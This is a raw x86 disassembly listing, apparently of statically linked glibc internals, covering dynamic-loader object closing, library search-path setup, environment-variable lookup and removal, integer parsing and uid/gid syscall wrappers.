mov eax, dword [edi + 0x1e4]
mov dword [var_50h], edx
mov dword [var_44h], ecx
mov dword [var_60h], eax
mov edx, dword [var_60h]
mov eax, dword [var_50h]
mov edx, dword [edx]
mov ecx, dword [edx + 0x1f4]
mov dword [var_58h], edx
cmp ecx, eax
mov dword [var_5ch], ecx
jae 0x8055bff
mov eax, dword [var_44h]
cmp dword [eax + ecx*4], edx
je 0x8055c1c
mov ecx, dword [var_40h]
mov byte [ecx + ebx + 0x10], 0
inc ebx
add dword [var_60h], 4
cmp ebx, dword [var_4ch]
jb 0x8055bdf
mov eax, dword [var_40h]
mov dword [var_20h_2], eax
jmp 0x8055ae3
mov edx, dword [var_40h]
mov byte [edx + ebx + 0x10], 1
jmp 0x8055c07
mov eax, dword [edi + 0xc]
mov dword [0x80aac58], eax
jmp 0x8055aa1
xor eax, eax
mov byte [var_21h_2], 1
test byte [edi + 0x174], 8
setne al
mov dword [var_8h], 0
mov dword [var_sp_ch], eax
mov eax, dword [0x80aabdc]
mov dword [var_4h], eax
mov eax, dword [edi + 0x228]
mov dword [esp], eax
call fcn.080554c0
test al, al
jne 0x8055c74
mov eax, dword [0x80aabe8]
mov dword [0x80aabd8], eax
mov eax, dword [edi + 0x224]
test eax, eax
je 0x8055a72
mov ebx, dword [var_34h]
test ebx, ebx
je 0x8055cdc
cmp eax, dword [var_34h]
je 0x8055cdc
mov ecx, eax
sub ecx, dword [edi + 0x218]
cmp ecx, dword [var_38h]
je 0x8055cd4
mov edx, dword [0x80aabd0]
cmp dword [var_38h], edx
je 0x8055cc9
cmp eax, edx
je 0x8055cbe
cmp dword [var_38h], eax
jae 0x8055a72
mov dword [var_38h], eax
mov dword [var_34h], ecx
jmp 0x8055a72
mov dword [0x80aabd0], ecx
jmp 0x8055a72
mov edx, dword [var_34h]
mov dword [0x80aabd0], edx
jmp 0x8055cb3
mov dword [var_38h], eax
jmp 0x8055a72
mov ecx, eax
sub ecx, dword [edi + 0x218]
mov dword [var_34h], ecx
mov ecx, dword [var_38h]
test ecx, ecx
jne 0x8055a72
jmp 0x8055cd4
mov ecx, dword [0x80a95b8]
mov edx, dword [ecx + 4]
mov dword [var_3ch], ecx
lea eax, [edx*4]
add eax, dword [ecx]
sub eax, 4
dec edx
cmp dword [eax], edi
jne 0x8055d09
mov ecx, dword [var_3ch]
inc edx
mov eax, dword [ecx + 4]
cmp edx, eax
jae 0x8055d37
mov ebx, eax
lea ecx, [edx*4]
mov eax, dword [var_3ch]
add ecx, dword [eax]
mov eax, dword [ecx]
inc edx
mov dword [ecx - 4], eax
add ecx, 4
cmp edx, ebx
jb 0x8055d2a
mov edx, dword [var_3ch]
dec dword [edx + 4]
jmp 0x8055a64
test eax, eax
jne 0x8055938
mov dword [var_sp_ch], str._dl_close
mov dword [var_8h], 0x13c
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.imap__l_type__lt_loaded__imap__l_opencount___0
call fcn.0805efc0
mov eax, dword [edi + 0x150]
test eax, eax
jne 0x8055920
mov ecx, dword [edi + 0x1d8]
test ecx, ecx
mov dword [var_2ch], ecx
mov eax, ecx
je 0x8055920
cmp dword [eax + 4], 0
mov ecx, 1
mov edx, eax
je 0x8055dc1
add edx, 4
nop
mov eax, dword [eax + ecx*4]
mov eax, dword [eax + 0x1f4]
cmp eax, esi
jb 0x8055e29
cmp eax, dword [var_1ch]
jae 0x8055e29
inc dword [ebx + eax*4]
add edx, 4
inc ecx
mov eax, dword [var_2ch]
cmp dword [edx], 0
jne 0x8055da0
mov edx, dword [var_2ch]
mov dword [edi + 0x154], ecx
lea eax, [edx + ecx*4 + 4]
xor ecx, ecx
mov dword [edi + 0x150], eax
mov eax, dword [edi + 0x1b4]
mov edx, dword [eax]
mov dword [var_48h], eax
test edx, edx
je 0x8055e0c
mov edx, dword [var_14h_2]
add edx, 0x150
mov dword [var_30h], edx
lea edx, [ecx*4]
mov dword [var_58h], edx
mov edx, dword [var_30h]
cmp dword [eax], edx
je 0x8055e18
add eax, 4
inc ecx
mov edx, dword [eax]
test edx, edx
jne 0x8055df1
movzx edx, byte [edi + 0x174]
jmp 0x8055920
mov edx, dword [var_58h]
mov ecx, dword [var_48h]
lea eax, [edi + 0x150]
mov dword [ecx + edx], eax
jmp 0x8055e0c
mov eax, dword [edx]
inc dword [eax + 0x170]
jmp 0x8055db5
test byte [edi + 0x1ec], 8
jne 0x8055908
test byte [0x80aac10], 2
jne 0x8055f1e
test byte [edi + 0x174], 8
je 0x8055e88
mov eax, dword [edi + 0x80]
test eax, eax
je 0x8055e81
mov eax, dword [eax + 4]
mov ecx, dword [edi]
add eax, ecx
mov dword [var_28h], eax
mov eax, dword [edi + 0x88]
mov ebx, dword [eax + 4]
shr ebx, 2
mov eax, ebx
dec ebx
test eax, eax
jne 0x8055f0c
mov eax, dword [edi + 0x4c]
test eax, eax
jne 0x8055f00
mov edx, dword [var_14h_2]
mov ebx, dword [edx + 0x154]
mov ecx, dword [edx + 0x150]
xor edx, edx
cmp edx, ebx
jae 0x8055eb8
lea esi, [esi]
cmp edi, dword [ecx + edx*4]
je 0x8055edc
inc edx
cmp edx, ebx
jb 0x8055ea0
xor eax, eax
test al, al
je 0x8055eb8
mov ebx, dword [var_18h]
jmp 0x8055e0c
mov dword [var_sp_ch], str._dl_close
mov dword [var_8h], 0x117
mov dword [var_4h], str.dl_close.c
mov dword [esp], 0x80a210a
jmp 0x8055d69
inc edx
cmp edx, ebx
jae 0x8055eed
mov eax, dword [ecx + edx*4]
mov dword [ecx + edx*4 - 4], eax
inc edx
cmp edx, ebx
jb 0x8055ee1
mov dword [ecx + edx*4 - 4], 0
mov edx, dword [var_14h_2]
dec dword [edx + 0x154]
jmp 0x8055eb0
mov eax, dword [eax + 4]
add eax, dword [edi]
call eax
jmp 0x8055e88
mov eax, dword [var_28h]
call dword [eax + ebx*4]
mov eax, ebx
dec ebx
test eax, eax
jne 0x8055f0c
jmp 0x8055e81
mov eax, dword [edi + 4]
mov dword [esp], str._ncalling_fini:__s_n_n
mov dword [var_4h], eax
call fcn.08081c40
jmp 0x8055e4d
movzx edx, byte [edi + 0x174]
jmp 0x8055908
mov dword [var_sp_ch], str._dl_close
mov dword [var_8h], 0xd9
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.new_opencount_0___0
jmp 0x8055d69
mov eax, dword [ecx + esi*4]
lea ecx, [var_ch_2]
mov dword [esp], eax
call fcn.080555e0
mov ecx, dword [var_10h]
mov ebx, dword [var_18h]
jmp 0x80558c0
mov ebx, dword [var_18h]
jmp 0x805589a
mov eax, dword [ecx + 4]
mov esi, 1
test eax, eax
je 0x805585a
inc esi
mov eax, dword [ecx + esi*4]
test eax, eax
jne 0x8055f97
jmp 0x805585a
test byte [eax + 0x174], 8
jne 0x8055819
jmp 0x80557b6
mov edx, dword [edx + 4]
xor ecx, ecx
xor eax, eax
mov dword [esp], str.shared_object_not_open
call fcn.08081200
mov dword [var_8h], 5
mov dword [var_4h], str.TLS_generation_counter_wrapped___Please_send_report_with_the_glibcbug_script.
mov dword [esp], str.libc
call fcn.0805f1f0
mov dword [esp], eax
call fcn.0804b4c0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
movzx eax, byte [arg_14h]
mov edi, dword [arg_10h]
mov esi, dword [arg_ch]
mov ecx, dword [arg_8h]
mov ebx, dword [esi]
mov edx, ecx
sub edx, edi
cmp edx, ebx
jb 0x8055581
mov edx, dword [esi + 4]
test edx, edx
jne 0x8055555
test al, al
jne 0x8055531
mov ebx, dword [0x80aabe8]
mov eax, ecx
sub eax, edi
inc ebx
lea esi, [esi]
test edi, edi
jne 0x805552b
cmp eax, ebx
jbe 0x8055527
dec eax
dec ecx
mov edx, dword [esi + eax*8 + 0xc]
test edx, edx
je 0x8055500
mov dword [0x80aabd8], ecx
mov edx, 1
add esp, 0x1c
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
xor edx, edx
jmp 0x805551d
test eax, eax
jne 0x8055508
jmp 0x8055527
mov dword [var_ch], str.remove_slotinfo
mov dword [var_8h], 0x31
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.__should_be_there
call fcn.0805efc0
movzx eax, al
mov dword [var_4h], edx
mov dword [esp], ecx
mov dword [var_ch], eax
lea eax, [ebx + edi]
mov dword [var_8h], eax
call fcn.080554c0
mov edx, 1
test al, al
jne 0x805551d
mov ecx, edi
add ecx, dword [esi]
jmp 0x80554ef
mov eax, dword [esi + edx*8 + 0xc]
test eax, eax
je 0x80555a3
cmp dword [eax + 0x228], ecx
jne 0x80555b4
mov eax, dword [0x80aabe4]
mov dword [esi + edx*8 + 0xc], 0
inc eax
mov dword [esi + edx*8 + 8], eax
cmp ecx, dword [0x80aabd8]
jne 0x8055518
jmp 0x80554ef
mov dword [var_ch], str.remove_slotinfo
mov dword [var_8h], 0x46
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.old_map__l_tls_modid__idx
jmp 0x8055550
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov eax, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_10h], ecx
mov edi, dword [eax + 0x150]
test edi, edi
je 0x8055680
mov eax, dword [eax + 0x154]
mov esi, 1
cmp esi, eax
jae 0x8055680
nop
mov ebx, dword [edi + esi*4]
test byte [ebx + 0x1ec], 8
je 0x8055625
test byte [ebx + 0x174], 8
jne 0x8055678
mov edx, dword [var_14h]
mov ecx, dword [ebx + 0x1f4]
mov eax, dword [edx - 8]
cmp ecx, dword [eax + 0x154]
jae 0x8055766
mov edx, dword [var_14h]
mov eax, dword [edx - 0xc]
mov edx, dword [eax + ecx*4]
dec edx
test edx, edx
mov dword [eax + ecx*4], edx
jne 0x8055758
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
jne 0x8055737
mov ecx, dword [var_14h]
mov dword [esp], ebx
call fcn.080555e0
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x154]
inc esi
cmp esi, eax
jb 0x8055610
lea esi, [esi]
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x1e4]
test eax, eax
je 0x80556cb
mov esi, dword [ebx + 0x1e0]
xor edi, edi
cmp edi, esi
jae 0x80556cb
lea esi, [esi]
mov edx, dword [eax + edi*4]
mov ebx, dword [var_14h]
mov ecx, dword [edx + 0x1f4]
cmp ecx, dword [ebx - 0x10]
jae 0x80556bb
mov eax, dword [ebx - 4]
mov ebx, dword [eax + ecx*4]
cmp ebx, edx
je 0x80556d3
inc edi
cmp edi, esi
jae 0x80556cb
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x1e4]
jmp 0x80556a0
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_14h]
mov eax, dword [edx - 0xc]
mov edx, dword [eax + ecx*4]
dec edx
test edx, edx
mov dword [eax + ecx*4], edx
jne 0x805572c
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
jne 0x8055708
mov ecx, dword [var_14h]
mov dword [esp], ebx
call fcn.080555e0
mov ebx, dword [arg_8h]
mov esi, dword [ebx + 0x1e0]
jmp 0x80556bb
mov dword [var_ch], str.mark_removed
mov dword [var_8h], 0xd0
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.remmap__l_reldeps_j___l_type__lt_loaded
call fcn.0805efc0
mov eax, dword [arg_8h]
mov esi, dword [eax + 0x1e0]
jmp 0x80556bb
mov dword [var_ch], str.mark_removed
mov dword [var_8h], 0xbd
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.dep_list_j___l_type__lt_loaded
jmp 0x8055727
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x154]
jmp 0x8055678
mov dword [var_ch], str.mark_removed
mov dword [var_8h], 0xba
mov dword [var_4h], str.dl_close.c
mov dword [esp], str.dep_list_j___l_idx___map__l_searchlist.r_nlist
jmp 0x8055727
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edi, dword [arg_8h]
mov dword [esp], edi
call fcn.08053400
mov dword [var_10h], eax
mov eax, dword [0x80aa840]
test eax, eax
je 0x8063217
movzx edx, byte [edi]
test dl, dl
je 0x8063217
cmp byte [edi + 1], 0
jne 0x8063226
mov esi, eax
movzx dx, dl
mov eax, dword [eax]
mov word [var_12h], dx
or word [var_12h], 0x3d00
test eax, eax
je 0x8063217
mov ebx, eax
movzx eax, word [var_12h]
cmp ax, word [ebx]
je 0x8063221
add esi, 4
mov ebx, dword [esi]
test ebx, ebx
jne 0x8063205
xor eax, eax
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
lea eax, [ebx + 2]
jmp 0x8063219
movzx edx, word [edi]
mov esi, eax
sub dword [var_10h], 2
mov eax, dword [eax]
add edi, 2
test eax, eax
mov word [var_12h], dx
je 0x8063217
mov ebx, eax
mov esi, esi
movzx eax, word [var_12h]
cmp ax, word [ebx]
je 0x8063256
add esi, 4
mov eax, dword [esi]
test eax, eax
mov ebx, eax
jne 0x8063240
jmp 0x8063217
mov edx, dword [var_10h]
lea eax, [ebx + 2]
mov dword [var_4h], edi
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.08076fc0
test eax, eax
jne 0x8063249
mov eax, dword [var_10h]
cmp byte [eax + ebx + 2], 0x3d
jne 0x8063249
mov edx, dword [var_10h]
lea eax, [edx + ebx + 3]
jmp 0x8063219
push ebp
mov ecx, 0x80aa9ec
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov edx, dword [0x80aac0c]
mov dword [var_10h], eax
mov eax, dword [0x80aac34]
mov dword [esp], 0x80aa9f0
call fcn.08056330
sub esp, 4
mov dword [0x80aa9e8], eax
mov dword [esp], 0xc
call fcn.08050fe0
test eax, eax
mov dword [0x80aa9f4], eax
mov esi, eax
je 0x807b917
mov edx, dword [0x80aa9ec]
mov eax, 0xcccccccd
lea edx, [edx*4 + 0x27]
mul edx
shr edx, 4
lea edx, [edx + edx*4]
mov eax, edx
mov dword [var_14h_3], edx
shl eax, 6
mov dword [esp], eax
call fcn.08050fe0
mov edx, str.cannot_create_cache_for_search_path
mov dword [esi], eax
mov eax, dword [0x80aa9f4]
mov eax, dword [eax]
test eax, eax
je 0x807b91c
mov dword [0x80aac68], eax
mov ecx, eax
mov dword [0x80aa9f8], 0
mov eax, dword [var_14h_3]
mov edi, str._lib_
xor ebx, ebx
shl eax, 2
mov dword [var_18h_3], eax
lea esi, [esi]
mov eax, dword [ebx*4 + 0x80a35f4]
mov dword [ecx + 0xc], edi
mov dword [esi], ecx
mov dword [ecx + 4], 0x80a36b3
mov dword [ecx + 8], 0
add esi, 4
mov dword [ecx + 0x10], eax
lea edi, [eax + edi + 1]
mov eax, dword [ecx + 0xc]
cmp byte [eax], 0x2f
jne 0x807b92d
mov edx, dword [0x80aa9ec]
xor eax, eax
cmp eax, edx
jae 0x807b7fd
lea esi, [esi]
mov dword [ecx + eax*4 + 0x14], 0
inc eax
cmp eax, edx
jb 0x807b7f0
mov eax, dword [var_18h_3]
inc ebx
lea edx, [eax + ecx]
xor eax, eax
cmp ebx, 2
cmovne eax, edx
cmp ebx, 1
mov dword [ecx], eax
mov ecx, edx
jbe 0x807b7b0
mov ebx, dword [var_10h_3]
mov dword [0x80aa9fc], 9
mov dword [esi], 0
test ebx, ebx
je 0x807b834
mov eax, dword [var_10h_3]
cmp byte [eax], 0
jne 0x807b850
mov dword [0x80aa9e0], 0xffffffff
mov eax, dword [0x80aac68]
mov dword [0x80aac50], eax
lea esp, [ebp - 0xc]
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], eax
mov ebx, eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_27h]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov ecx, 1
mov esi, eax
movzx eax, byte [ebx]
test al, al
je 0x807b89d
sub eax, 0x3a
lea edx, [ecx + 1]
cmp al, 1
cmovbe ecx, edx
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x807b88a
lea eax, [ecx*4 + 4]
mov dword [esp], eax
call fcn.08050fe0
mov edx, str.cannot_create_cache_for_search_path
test eax, eax
mov ecx, eax
mov dword [0x80aa9e0], eax
je 0x807b91c
mov eax, dword [0x80a95f4]
mov dword [var_4h], ecx
mov dword [var_18h], 0
mov dword [var_14h], str.LD_LIBRARY_PATH
mov dword [var_8h], 0x80a36c6
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807b2c0
mov eax, dword [0x80aa9e0]
mov ecx, dword [eax]
test ecx, ecx
je 0x807b903
mov dword [0x80aa9e4], 0
jmp 0x807b83e
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aa9e0], 0xffffffff
jmp 0x807b8f4
mov edx, str.cannot_create_search_path_array
mov dword [esp], edx
xor ecx, ecx
mov eax, 0xc
xor edx, edx
call fcn.08081200
mov dword [var_ch], str._dl_init_paths
mov dword [var_8h], 0x2a2
mov dword [var_4h], str.dl_load.c
mov dword [esp], str.pelem__dirname_0____
call fcn.0805efc0
jmp fcn.0807b960
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
test esi, esi
je 0x806366f
cmp byte [esi], 0
je 0x806366f
mov dword [var_sp_4h], 0x3d
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
je 0x806368a
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esp], esi
call fcn.08053400
mov edi, eax
mov eax, 0
test eax, eax
je 0x80636a9
mov dword [esp], 0x80aa984
call section.
mov ebx, dword [0x80aa840]
mov eax, dword [ebx]
test eax, eax
je 0x80636dc
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], esi
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08076fc0
test eax, eax
jne 0x80636d3
mov eax, dword [ebx]
cmp byte [edi + eax], 0x3d
je 0x80636f5
add ebx, 4
mov eax, dword [ebx]
test eax, eax
jne 0x80636b5
mov eax, 0
test eax, eax
je 0x80636f1
mov dword [esp], 0x80aa984
call section.
xor eax, eax
jmp 0x806367f
mov edx, ebx
mov eax, dword [edx + 4]
mov dword [edx], eax
add edx, 4
test eax, eax
jne 0x80636f7
jmp 0x80636d6
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x21
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x80637c1
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063840
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x806379b
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x40
mov dword [var_2ch], 0
mov dword [var_28h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8063b98
mov dword [var_30h], 0
test esi, esi
js 0x8063880
cmp esi, 1
je 0x8063880
cmp esi, 0x24
jle 0x8063895
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
add esp, 0x40
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [arg_8h]
mov edi, dword [arg_18h]
mov dword [var_1ch], ebx
mov edi, dword [edi + 0x34]
movsx eax, byte [ebx]
mov dword [var_3ch], edi
test byte [edi + eax*2 + 1], 0x20
je 0x8063b8d
inc ebx
mov ecx, dword [var_3ch]
movzx edx, byte [ebx]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x80638b2
test dl, dl
je 0x80639c2
cmp dl, 0x2d
mov dword [var_10h], 0
je 0x8063b84
cmp dl, 0x2b
je 0x8063b7b
cmp dl, 0x30
je 0x8063b43
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_1ch], ebx
cmove eax, dword [var_30h]
mov dword [var_20h], 0
test eax, eax
mov dword [var_30h], eax
jne 0x8063a8f
movzx eax, byte [esi + 0x80928fe]
mov edi, dword [esi*4 + 0x8092858]
mov dword [var_24h], 0
mov dword [var_3ch], 0
mov dword [var_14h], edi
mov dword [var_18h], eax
movzx ecx, byte [ebx]
test cl, cl
je 0x8063982
cmp ebx, dword [var_20h]
je 0x8063982
lea eax, [ecx - 0x30]
cmp al, 9
ja 0x8063a1e
mov ecx, eax
movzx eax, cl
cmp eax, esi
jge 0x8063982
mov edx, dword [var_14h]
cmp dword [var_3ch], edx
ja 0x8063a12
je 0x8063a09
mov edi, dword [var_3ch]
movzx eax, cl
imul edi, esi
add edi, eax
mov dword [var_3ch], edi
inc ebx
movzx ecx, byte [ebx]
test cl, cl
jne 0x8063941
cmp ebx, dword [var_1ch]
je 0x80639c2
mov esi, dword [arg_ch]
test esi, esi
je 0x8063993
mov eax, dword [arg_ch]
mov dword [eax], ebx
mov ecx, dword [var_24h]
test ecx, ecx
jne 0x80639ad
mov eax, dword [var_3ch]
mov edx, dword [var_10h]
neg eax
test edx, edx
cmove eax, dword [var_3ch]
jmp 0x806388d
call fcn.08048b20
mov dword [eax], 0x22
mov eax, 0xffffffff
jmp 0x806388d
mov eax, dword [arg_ch]
test eax, eax
je 0x806388b
mov eax, dword [var_1ch]
sub eax, dword [arg_8h]
dec eax
jle 0x80639e9
mov ecx, dword [var_1ch]
mov edi, dword [arg_18h]
movsx edx, byte [ecx - 1]
mov eax, dword [edi + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x80639f6
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x806388b
cmp byte [ecx - 2], 0x30
jne 0x80639e9
mov edx, dword [arg_ch]
mov eax, ecx
dec eax
mov dword [edx], eax
jmp 0x806388b
cmp eax, dword [var_18h]
jbe 0x806396c
mov dword [var_24h], 1
jmp 0x806397a
mov edi, dword [var_2ch]
test edi, edi
je 0x8063a76
xor edx, edx
cmp edx, dword [var_2ch]
jae 0x8063a42
lea esi, [esi]
mov edi, dword [var_28h]
movzx eax, byte [edx + ebx]
cmp byte [edx + edi], al
jne 0x8063a42
inc edx
cmp edx, dword [var_2ch]
jb 0x8063a30
cmp edx, dword [var_2ch]
je 0x8063a6a
movzx edx, cl
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x8063982
mov eax, dword [ecx + 0x3c]
movzx ecx, byte [eax + edx*4]
sub ecx, 0x37
jmp 0x8063953
mov eax, dword [var_2ch]
lea ebx, [eax + ebx - 1]
jmp 0x806397a
mov edi, dword [arg_18h]
movzx edx, cl
mov eax, dword [edi + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x8063982
mov eax, dword [edi + 0x3c]
jmp 0x8063a5e
mov edi, dword [var_28h]
mov dword [esp], edi
call fcn.08053400
xor edx, edx
mov dword [var_20h], ebx
mov dword [var_2ch], eax
mov dword [var_34h], eax
cmp edx, dword [var_2ch]
jae 0x8063abc
mov ecx, dword [var_28h]
movzx eax, byte [edx + ebx]
cmp byte [edx + ecx], al
jne 0x8063abc
inc edx
cmp edx, dword [var_34h]
jb 0x8063aaa
cmp edx, dword [var_34h]
jae 0x8063918
movzx ecx, byte [ebx]
test cl, cl
je 0x8063b1e
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8063b11
xor edx, edx
cmp edx, dword [var_34h]
jae 0x8063aef
mov eax, dword [var_20h]
mov edi, dword [var_28h]
movzx eax, byte [edx + eax]
cmp byte [edx + edi], al
jne 0x8063aef
inc edx
cmp edx, dword [var_34h]
jb 0x8063ada
cmp edx, dword [var_34h]
jae 0x8063b11
mov eax, dword [var_3ch]
movzx edx, cl
test byte [eax + edx*2 + 1], 4
je 0x8063b1e
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x8063b1e
inc dword [var_20h]
mov edi, dword [var_20h]
movzx ecx, byte [edi]
test cl, cl
jne 0x8063acc
mov eax, dword [var_30h]
mov edx, dword [var_28h]
mov dword [esp], ebx
mov ecx, dword [var_20h]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08049980
mov dword [var_20h], eax
jmp 0x8063918
test esi, esi
je 0x8063b5e
cmp esi, 0x10
je 0x8063b5e
test esi, esi
jne 0x80638f7
mov esi, 8
jmp 0x80638f7
mov ecx, dword [arg_18h]
movsx edx, byte [ebx + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x8063b4c
add ebx, 2
mov esi, 0x10
jmp 0x80638f7
inc ebx
movzx edx, byte [ebx]
jmp 0x80638e4
mov dword [var_10h], 1
jmp 0x8063b7b
mov edi, dword [arg_8h]
movzx edx, byte [edi]
jmp 0x80638c3
mov ecx, dword [eax + 0x2c]
mov dword [var_30h], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x806386b
cmp dl, 0x7f
je 0x806386b
mov eax, dword [eax + 0x28]
mov dword [var_28h], eax
cmp byte [eax], 0
jne 0x8063872
mov dword [var_28h], 0
jmp 0x806386b
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078855
mov eax, 0x31
int 0x80
leave
ret
mov eax, 0xc9
int 0x80
cmp eax, 0xfffff000
jbe 0x8078853
cmp eax, 0xffffffda
jne 0x8078853
mov dword [0x80a9c10], 1
jmp 0x807884c
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078815
mov eax, 0x18
int 0x80
leave
ret
mov eax, 0xc7
int 0x80
cmp eax, 0xfffff000
jbe 0x8078813
cmp eax, 0xffffffda
jne 0x8078813
mov dword [0x80a9c10], 1
jmp 0x807880c
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x80788d5
mov eax, 0x32
int 0x80
leave
ret
mov eax, 0xca
int 0x80
cmp eax, 0xfffff000
jbe 0x80788d3
cmp eax, 0xffffffda
jne 0x80788d3
mov dword [0x80a9c10], 1
jmp 0x80788cc
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078895
mov eax, 0x2f
int 0x80
leave
ret
mov eax, 0xc8
int 0x80
cmp eax, 0xfffff000
jbe 0x8078893
cmp eax, 0xffffffda
jne 0x8078893
mov dword [0x80a9c10], 1
jmp 0x807888c
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aac78]
mov dword [esp], ebx
mov dword [var_4h], esi
test eax, eax
je 0x805639f
mov ebx, dword [esp]
mov esi, dword [var_4h]
leave
ret
call fcn.08078840
xor esi, esi
mov ebx, eax
call fcn.08078800
cmp ebx, eax
je 0x80563be
mov esi, 1
mov dword [0x80a95f4], esi
jmp 0x8056396
call fcn.080788c0
mov ebx, eax
call fcn.08078880
cmp ebx, eax
jne 0x80563b1
jmp 0x80563b6
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
rdtsc
mov dword [0x80aac2c], edx
mov edx, dword [0x80aac74]
mov dword [0x80aac28], eax
test edx, edx
jne 0x805610a
call fcn.080546b0
mov dword [0x80aac74], eax
mov dword [esp], str.LD_WARN
mov ebx, 0x80a4f11
call fcn.080631c0
test eax, eax
cmove eax, ebx
cmp byte [eax], 0
mov dword [esp], str.LD_LIBRARY_PATH
setne al
movzx eax, al
mov dword [0x80aac54], eax
call fcn.080631c0
call fcn.0807b700
mov dword [esp], str.LD_BIND_NOW
call fcn.080631c0
test eax, eax
cmove eax, ebx
cmp byte [eax], 0
mov dword [esp], str.LD_BIND_NOT
sete al
movzx eax, al
mov dword [0x80aac38], eax
call fcn.080631c0
test eax, eax
cmove eax, ebx
cmp byte [eax], 0
mov dword [esp], str.LD_DYNAMIC_WEAK
setne al
movzx eax, al
mov dword [0x80aac30], eax
call fcn.080631c0
test eax, eax
cmovne ebx, eax
xor eax, eax
cmp byte [ebx], 0
mov dword [esp], str.LD_PROFILE_OUTPUT
sete al
mov dword [0x80aac48], eax
call fcn.080631c0
test eax, eax
mov dword [0x80aabfc], eax
je 0x80561b9
cmp byte [eax], 0
jne 0x8056319
mov ecx, dword [0x80a95f4]
mov edx, str._var_tmp
mov eax, str._var_profile
test ecx, ecx
cmovne edx, eax
mov dword [0x80aabfc], edx
test ecx, ecx
je 0x805620b
xor ebx, ebx
mov eax, dword [ebx*4 + 0x80a95ec]
inc ebx
mov dword [esp], eax
call fcn.08063640
cmp ebx, 1
jbe 0x80561da
mov dword [var_4h], 0
mov dword [esp], str._etc_suid_debug
call fcn.080796e0
test eax, eax
jne 0x8056308
mov edx, dword [0x80aac34]
test edx, edx
je 0x8056222
xor eax, eax
cmp byte [edx], 0
cmovne eax, edx
mov dword [0x80aac34], eax
mov dword [esp], str.LD_ASSUME_KERNEL
call fcn.080631c0
test eax, eax
je 0x80562ac
mov dword [var_14h], 0
mov ebx, eax
xor esi, esi
mov edi, 0x10
lea eax, [var_10h]
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.08063780
